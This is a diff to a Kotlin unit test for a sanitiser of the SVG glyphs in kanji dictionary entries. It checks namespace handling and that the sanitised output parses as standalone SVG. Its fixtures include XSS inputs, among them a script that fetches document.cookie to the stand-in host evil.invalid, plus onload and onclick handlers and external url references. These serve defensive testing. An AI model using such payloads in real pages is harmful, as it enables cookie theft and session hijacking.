@@ -12,6 +12,28 @@ import kotlinx.serialization.json.jsonPrimitive
 import mihon.core.dictionary.model.KanjiEntry
 import mihon.core.dictionary.model.KanjiResult
 import org.junit.jupiter.api.Test
+import org.w3c.dom.Document
+import org.w3c.dom.Element
+import org.xml.sax.InputSource
+import java.io.StringReader
+import javax.xml.parsers.DocumentBuilderFactory
+
+private const val SVG_NAMESPACE = "http://www.w3.org/2000/svg"
+private const val XLINK_NAMESPACE = "http://www.w3.org/1999/xlink"
+
+/**
+ * Parses [markup] the way the renderer does: as a standalone XML document, namespace-aware, with no
+ * external entity resolution. Throws (`unbound prefix`, wrong namespace, malformed markup) when the
+ * sanitiser emitted something the renderer cannot import.
+ */
+private fun parseAsSvg(markup: String): Document {
+    val factory = DocumentBuilderFactory.newInstance().apply {
+        isNamespaceAware = true
+        isExpandEntityReferences = false
+        setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
+    }
+    return factory.newDocumentBuilder().parse(InputSource(StringReader(markup)))
+}
 
 /**
  * Kanji definitions come from third-party dictionaries and are rendered as inline SVG inside a
@@ -68,7 +90,9 @@ class KanjiSvgSanitizationTest {
 
         val sanitized = sanitizeKanjiRichText(markup)
 
-        sanitized shouldBe """<svg viewBox="0 0 1 1"><path d="M1 1"/></svg>"""
+        // The root namespace is injected, so the glyph is a standalone SVG document.
+        sanitized shouldBe """<svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg">""" +
+            """<path d="M1 1"/></svg>"""
     }
 
     @Test
@@ -81,10 +105,86 @@ class KanjiSvgSanitizationTest {
     @Test
     fun `an external href is reduced to a local reference or dropped`() {
         sanitizeKanjiSvgMarkup("""<svg><use href="https://evil.invalid/a.svg#x"/></svg>""") shouldBe
-            "<svg><use/></svg>"
+            """<svg xmlns="http://www.w3.org/2000/svg"><use/></svg>"""
         sanitizeKanjiSvgMarkup("""<svg><use href="#glyph"/></svg>""") shouldBe
-            """<svg><use href="#glyph"/></svg>"""
+            """<svg xmlns="http://www.w3.org/2000/svg"><use href="#glyph"/></svg>"""
     }
+
+    @Test
+    fun `an xlink reference keeps a matching namespace declaration`() {
+        val sanitized = sanitizeKanjiSvgMarkup("""<svg><use xlink:href="#g"/></svg>""")
+
+        sanitized shouldContain """xlink:href="#g""""
+        sanitized shouldContain """xmlns:xlink="$XLINK_NAMESPACE""""
+        // Without both declarations this is an `unbound prefix` XML parse error, not a glyph.
+        val document = parseAsSvg(sanitized)
+        document.documentElement.namespaceURI shouldBe SVG_NAMESPACE
+        val use = document.getElementsByTagNameNS(SVG_NAMESPACE, "use").item(0) as Element
+        use.getAttributeNS(XLINK_NAMESPACE, "href") shouldBe "#g"
+    }
+
+    @Test
+    fun `a namespace declaration the dictionary already made is preserved`() {
+        sanitizeKanjiSvgMarkup(
+            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="$XLINK_NAMESPACE">""" +
+                """<use xlink:href="#g"/></svg>""",
+        ) shouldBe
+            """<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="$XLINK_NAMESPACE">""" +
+            """<use xlink:href="#g"/></svg>"""
+    }
+
+    @Test
+    fun `a root without a namespace declaration gets the svg one`() {
+        val sanitized = sanitizeKanjiSvgMarkup("""<svg><use href="#glyph"/></svg>""")
+
+        sanitized shouldBe """<svg xmlns="http://www.w3.org/2000/svg"><use href="#glyph"/></svg>"""
+        parseAsSvg(sanitized).documentElement.namespaceURI shouldBe SVG_NAMESPACE
+    }
+
+    @Test
+    fun `xml space survives and style stays refused`() {
+        val sanitized = sanitizeKanjiSvgMarkup(
+            """<svg><text xml:space="preserve" style="fill:red">一</text></svg>""",
+        )
+
+        sanitized shouldContain """xml:space="preserve""""
+        sanitized shouldNotContain "style="
+    }
+
+    @Test
+    fun `every sanitised glyph fixture parses as standalone svg`() {
+        val fixtures = listOf(
+            """<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">""" +
+                """<g transform="translate(4 4)"><path d="M0 0 L10 10" fill="none" stroke="#000" """ +
+                """stroke-width="4"/></g></svg>""",
+            """<svg viewBox="0 0 100 100" onload="alert('x')">""" +
+                """<script>fetch('https://evil.invalid/?d='+document.cookie)</script>""" +
+                """<path d="M0 0" fill="#000"/></svg>""",
+            """<svg><use xlink:href="#g"/></svg>""",
+            """<svg><use href="#glyph"/></svg>""",
+            """<svg viewBox="0 0 1 1"><foreignObject><div><img src="x"/></div></foreignObject>""" +
+                """<style>rect{background:url(https://evil.invalid/a)}</style>""" +
+                """<path d="M1 1" style="fill:red" onclick="alert(2)"/></svg>""",
+            """<svg><defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient>""" +
+                """</defs><rect fill="url(#g)" width="1" height="1"/></svg>""",
+        )
+
+        for (fixture in fixtures) {
+            val sanitized = sanitizeKanjiRichText(fixture)
+            withClue(fixture, sanitized) {
+                val document = parseAsSvg(sanitized)
+                document.documentElement.namespaceURI shouldBe SVG_NAMESPACE
+                document.documentElement.localName shouldBe "svg"
+            }
+        }
+    }
+
+    private fun <T> withClue(fixture: String, sanitized: String, block: () -> T): T =
+        try {
+            block()
+        } catch (failure: Exception) {
+            throw AssertionError("failed for $fixture -> $sanitized", failure)
+        }
 
     @Test
     fun `markup without an svg root is returned as inert text`() {
